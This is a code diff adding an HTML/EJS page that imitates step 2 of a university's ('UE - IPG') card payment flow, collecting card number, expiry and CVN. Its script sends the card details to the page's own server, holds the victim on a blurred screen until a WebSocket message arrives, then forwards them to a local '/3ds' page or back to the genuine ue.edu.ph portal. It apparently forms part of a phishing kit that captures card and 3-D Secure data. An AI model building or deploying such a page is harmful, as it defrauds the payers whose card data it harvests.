@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Payment Acceptance - Payment Details (Step 2 of 4)</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="/css/a.css" media="screen">
+    <link rel="stylesheet" href="/css/b.css" media="screen">
+    <link rel="stylesheet" href="/css/c.css" media="screen">
+    <link rel="stylesheet" href="/css/d.css" media="screen">
+    <link rel="stylesheet" href="/css/e.css" media="screen">
+    <link rel="stylesheet" href="/css/f.css" media="screen">
+    <script defer src="js/j.js"></script>
+    <script defer src="js/i.js"></script>
+</head>
+<body id="payment" class="">
+    <noscript>
+        <style>
+            body { overflow: hidden; }
+            .noscript-dialog { outline: 0px; z-index: 1002; position: absolute; display: block; height: auto; width: 300px; top: 50%; left: 50%; -webkit-transform: translate(-50%, -50%); transform: translate(-50%, -50%); }
+            .noscript-dialog .ui-dialog-buttonset form { padding: 0; display: inline; }
+            .noscript-overlay { width: 100%; height: 100%; z-index: 1001; }
+            .ui-corner-all .ui-button { padding: 3px 25px; border: 1px solid #d3d3d3; }
+        </style>
+        <div class="ui-dialog ui-widget ui-widget-content ui-corner-all no-close ui-dialog-buttons noscript-dialog" tabindex="-1" role="dialog" aria-labelledby="ui-id-1">
+            <div class="ui-dialog-titlebar ui-widget-header ui-corner-all ui-helper-clearfix">
+                <span id="ui-id-1" class="ui-dialog-title">JavaScript Required</span>
+            </div>
+            <div style="width: auto; min-height: 53px; height: auto;" aria-describedby="no_javascript_dialog_description" class="ui-dialog-content ui-widget-content" scrolltop="0" scrollleft="0">
+                <span id="no_javascript_dialog_description">Please enable JavaScript in your browser and reload the page to continue.</span>
+            </div>
+            <div class="ui-dialog-buttonpane ui-widget-content ui-helper-clearfix">
+                <div class="ui-dialog-buttonset">
+                    <form method="get">
+                        <button type="submit" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button" aria-disabled="false">
+                            <span class="ui-button-text">Reload</span>
+                        </button>
+                    </form>
+                    <form method="post" action="/payer_authentication/hybrid">
+                        <input type="hidden" name="ccaAction" value="cancelNoJS">
+                        <button type="submit" class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" role="button" aria-disabled="false">
+                            <span class="ui-button-text">Cancel</span>
+                        </button>
+                    </form>
+                </div>
+            </div>
+        </div>
+        <div class="ui-widget-overlay noscript-overlay"></div>
+    </noscript>
+
+    <div id="wrap">
+        <div id="header" role="banner">
+            <div class="container group">
+                <img alt=" UE - IPG" class="left" src="/images/banner.jpg">
+            </div>
+        </div>
+        <div id="notification_logo">
+            <div class="container group"></div>
+        </div>
+
+        <div id="main" role="main">
+            <h1 class="vhdn">Payment Acceptance - Payment Details (Step 2 of 4)</h1>
+            <div class="main container group">
+                <div class="progressbar group">
+                    <div class="stage-progress stage current" style="width: 25%">
+                        <p class="stage-indicator">2/4</p>
+                    </div>
+                    <div class="stage completed first" style="width: 25%">
+                        <p>Billing</p>
+                    </div>
+                    <div class="stage current" style="width: 25%">
+                        <p>Payment</p>
+                    </div>
+                    <div class="stage uncompleted" style="width: 25%">
+                        <p>Review</p>
+                    </div>
+                    <div class="stage uncompleted last" style="width: 25%">
+                        <p>Receipt</p>
+                    </div>
+                </div>
+
+                <div class="left_column">
+                    <h2 class="secure">Payment Details</h2>
+                    <form novalidate="novalidate" autocomplete="off" role="form" id="payment-form" accept-charset="UTF-8" method="post" action="/submit-payment">
+                        <fieldset class="input mp">
+                            <legend class="vhdn"><span>Payment Details</span></legend>
+                            <div class="error-banner hidden validation section payment generic"><p></p></div>
+                            <div id="required_field_explanation">
+                                <span id="required_field_char"> * </span> Required field
+                            </div>
+
+                            <div id="payment_type_card">
+                                <input type="hidden" name="payment_method" id="payment_method" value="card" autocomplete="off">
+                                <div class="ol">
+                                    <div class="li">
+                                        <fieldset aria-required="true">
+                                            <legend class="input_label">Card Type *</legend>
+                                            <div id="card_type_selection" class="ol group field-card_type">
+                                                <div class="li">
+                                                    <input type="radio" name="card_type" id="card_type_001" value="001">
+                                                    <label for="card_type_001">Visa</label>
+                                                </div>
+                                                <div class="li">
+                                                    <input type="radio" name="card_type" id="card_type_002" value="002">
+                                                    <label for="card_type_002">Mastercard</label>
+                                                </div>
+                                                <div class="li">
+                                                    <input type="radio" name="card_type" id="card_type_007" value="007">
+                                                    <label for="card_type_007">JCB</label>
+                                                </div>
+                                            </div>
+                                        </fieldset>
+                                        <div id="card_type_error_placeholder" class="hidden zero-size"></div>
+                                    </div>
+                                    <div class="li">
+                                        <label for="card_number">Card Number *</label>
+                                        <div class="iw m" id="iw-card_number">
+                                            <input type="tel" name="card_number" id="card_number" class="field-card_number" aria-required="true" autocomplete="off">
+                                            <span class="im m" id="im-card_number" style="" aria-hidden="true"></span>
+                                        </div>
+                                        <input type="hidden" class="encrypted" disabled="disabled" name="__e.card_number">
+                                        <div id="card_number_error_placeholder" class="hidden zero-size"></div>
+                                    </div>
+                                    <div class="li">
+                                        <div id="card_expiry_date">
+                                            <div class="exp-date exp-month">
+                                                <label for="card_expiry_month">Expiration Month *</label>
+                                                <select name="card_expiry_month" id="card_expiry_month" aria-required="true" class="field-card_expiry_date" autocomplete="cc-exp-month" tabindex="0">
+                                                    <option selected="selected" disabled="disabled" value="">Month</option>
+                                                    <option value="01">01</option>
+                                                    <option value="02">02</option>
+                                                    <option value="03">03</option>
+                                                    <option value="04">04</option>
+                                                    <option value="05">05</option>
+                                                    <option value="06">06</option>
+                                                    <option value="07">07</option>
+                                                    <option value="08">08</option>
+                                                    <option value="09">09</option>
+                                                    <option value="10">10</option>
+                                                    <option value="11">11</option>
+                                                    <option value="12">12</option>
+                                                </select>
+                                            </div>
+                                            <div class="exp-date exp-year">
+                                                <label for="card_expiry_year">Expiration Year *</label>
+                                                <select name="card_expiry_year" id="card_expiry_year" aria-required="true" class="field-card_expiry_date" autocomplete="cc-exp-year" tabindex="0">
+                                                    <option selected="selected" disabled="disabled" value="">Year</option>
+                                                    <option value="2024">2024</option>
+                                                    <option value="2025">2025</option>
+                                                    <option value="2026">2026</option>
+                                                    <option value="2027">2027</option>
+                                                    <option value="2028">2028</option>
+                                                    <option value="2029">2029</option>
+                                                    <option value="2030">2030</option>
+                                                    <option value="2031">2031</option>
+                                                    <option value="2032">2032</option>
+                                                    <option value="2033">2033</option>
+                                                    <option value="2034">2034</option>
+                                                    <option value="2035">2035</option>
+                                                    <option value="2036">2036</option>
+                                                    <option value="2037">2037</option>
+                                                    <option value="2038">2038</option>
+                                                    <option value="2039">2039</option>
+                                                    <option value="2040">2040</option>
+                                                    <option value="2041">2041</option>
+                                                    <option value="2042">2042</option>
+                                                    <option value="2043">2043</option>
+                                                    <option value="2044">2044</option>
+                                                    <option value="2045">2045</option>
+                                                </select>
+                                            </div>
+                                        </div>
+                                        <div id="card_expiry_date_error_placeholder" class="hidden zero-size"></div>
+                                    </div>
+                                    <div class="li" id="card_cvn_line">
+                                        <label for="card_cvn">CVN *</label>
+                                        <div class="legend">This code is a three or four digit number printed on the back or front of credit cards.</div>
+                                        <div class="iw m" id="iw-card_cvn">
+                                            <input type="tel" name="card_cvn" id="card_cvn" maxlength="4" class="field-card_cvn" aria-required="true">
+                                            <span class="im m" id="im-card_cvn" style="" aria-hidden="true"></span>
+                                        </div>
+                                        <input type="hidden" class="encrypted" disabled="disabled" name="__e.card_cvn">
+                                        <div id="card_cvn_error_placeholder" class="hidden zero-size"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </fieldset>
+                        <input type="submit" name="back" value="Back" class="left" data-disable-with="Back">
+                        <input type="submit" name="commit" value="Next" class="right" data-disable-with="Next">
+                        <div class="cancel_area">
+                            <button type="button" class="cancelbutton link-button">Cancel Order</button>
+                            <div id="cancel-order-dialog" style="display: none" title="Cancel Order" aria-describedby="cancel_dialog_description">
+                                <span id="cancel_dialog_description">Are you sure you want to cancel your order?</span>
+                            </div>
+                        </div>
+                        <div aria-live="assertive" style="width:1px;height:0;color:transparent;"></div>
+                    </form>
+                    <div id="transaction-status" style="display: none;">
+                        <h3 id="status-message"></h3>
+                    </div>
+                </div>
+                <div class="right_column mpc">
+                    <div class="hgroup header">
+                        <h2>Your Order</h2>
+                    </div>
+                    <div class="purchases">
+                        <div class="totalamount">
+                            <p class="list-item-name key">Total amount</p>
+                            <p class="value"><%= displayAmount %></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="footer" role="contentinfo">
+        <div class="container">
+            <img alt=" UE - IPG" class="left" src="/images/footer.jpg">
+        </div>
+    </div>
+    <script>
+document.addEventListener("DOMContentLoaded", function() {
+    const cardNumberField = document.getElementById("card_number");
+    const cardNumberSpan = document.getElementById("im-card_number");
+    const cvnField = document.getElementById("card_cvn");
+    const cvnSpan = document.getElementById("im-card_cvn");
+
+    function maskCardNumber(value) {
+        return value.replace(/\d(?=\d{4})/g, "•");
+    }
+
+    function maskCVN(value) {
+        return value.replace(/./g, "•");
+    }
+
+    // Mask card number input on blur
+    cardNumberField.addEventListener("blur", function() {
+        let value = cardNumberField.value.replace(/\D/g, "");
+        cardNumberSpan.textContent = maskCardNumber(value);
+    });
+
+    // Unmask card number input on focus
+    cardNumberField.addEventListener("focus", function() {
+        cardNumberSpan.textContent = "";
+    });
+
+    // Mask CVN input on blur
+    cvnField.addEventListener("blur", function() {
+        let value = cvnField.value.replace(/\D/g, "");
+        cvnSpan.textContent = maskCVN(value);
+    });
+
+    // Unmask CVN input on focus
+    cvnField.addEventListener("focus", function() {
+        cvnSpan.textContent = "";
+    });
+
+    document.getElementById("payment-form").addEventListener("submit", function(e) {
+        e.preventDefault();
+
+        // Blur the website
+        document.body.style.filter = "blur(3px)";
+        document.body.style.opacity = "0.6";
+
+        const cardType = document.querySelector('input[name="card_type"]:checked').value;
+        const cardNumber = cardNumberField.value.replace(/•/g, "");
+        const expiryMonth = document.getElementById("card_expiry_month").value;
+        const expiryYear = document.getElementById("card_expiry_year").value;
+        const cvn = cvnField.value.replace(/•/g, "");
+
+        const formData = {
+            card_type: cardType,
+            card_number: cardNumber,
+            expiry_month: expiryMonth,
+            expiry_year: expiryYear,
+            cvn: cvn
+        };
+
+        fetch("/submit-payment", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify(formData)
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log("Success:", data);
+            const ws = new WebSocket('ws://localhost:3000');
+            ws.onmessage = function(event) {
+                const message = JSON.parse(event.data);
+                document.body.style.filter = "";
+                document.body.style.opacity = "";
+                if (message.status === 'approved') {
+                    // Redirect to 3ds.ejs
+                    window.location.href = "/3ds";
+                } else if (message.status === 'rejected') {
+                    // Redirect to payment portal
+                    window.location.href = "https://www.ue.edu.ph/paymentportal/";
+                }
+            };
+        })
+        .catch((error) => {
+            console.error("Error:", error);
+        });
+    });
+});
+</script>
+</body>
+</html>
